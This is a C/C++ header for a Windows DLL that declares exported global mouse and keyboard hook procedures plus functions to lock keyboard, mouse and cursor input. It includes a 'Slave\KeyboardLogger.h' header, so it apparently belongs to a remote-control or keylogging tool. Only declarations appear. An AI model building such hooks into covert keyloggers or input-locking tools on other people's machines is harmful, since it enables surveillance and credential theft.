
// The following ifdef block is the standard way of creating macros which make exporting 
// from a DLL simpler. All files within this DLL are compiled with the PROCEDURESDLL_EXPORTS
// symbol defined on the command line. this symbol should not be defined on any project
// that uses this DLL. This way any other project whose source files include this file see 
// PROCEDURESDLL_API functions as being imported from a DLL, wheras this DLL sees symbols
// defined with this macro as being exported.
#ifdef PROCEDURESDLL_EXPORTS
#define PROCEDURESDLL_API __declspec(dllexport)
#else
#define PROCEDURESDLL_API __declspec(dllimport)
#endif


#include "..\Slave\KeyboardLogger.h"


typedef void CALLBACK CCallbackProcedure();


// Exported variable
//extern PROCEDURESDLL_API int nProceduresDLL;

// Exported function
//PROCEDURESDLL_API int fnProceduresDLL(void);

LRESULT PROCEDURESDLL_API CALLBACK MouseProc(int code, WPARAM wParam, LPARAM lParam);

LRESULT PROCEDURESDLL_API CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);

// Обертки
HHOOK PROCEDURESDLL_API GetMouseHook();
void PROCEDURESDLL_API SetMouseHook(HHOOK hNewMouseHook);

HHOOK PROCEDURESDLL_API GetKeyboardHook();
void PROCEDURESDLL_API SetKeyboardHook(HHOOK hNewKeyboardHook);

void PROCEDURESDLL_API SetLockingCursor(DWORD dwNewValue);
DWORD PROCEDURESDLL_API GetLockingCursor();

void PROCEDURESDLL_API SetuiState(DWORD uiNewState);
DWORD PROCEDURESDLL_API GetuiState();

void PROCEDURESDLL_API SetCallbackThreadID(DWORD dwNew);

void PROCEDURESDLL_API SetKeyboardLocked(bool bNew);
bool PROCEDURESDLL_API GetKeyboardLocked();
void PROCEDURESDLL_API SetMouseLocked(bool bNew);
bool PROCEDURESDLL_API GetMouseLocked();
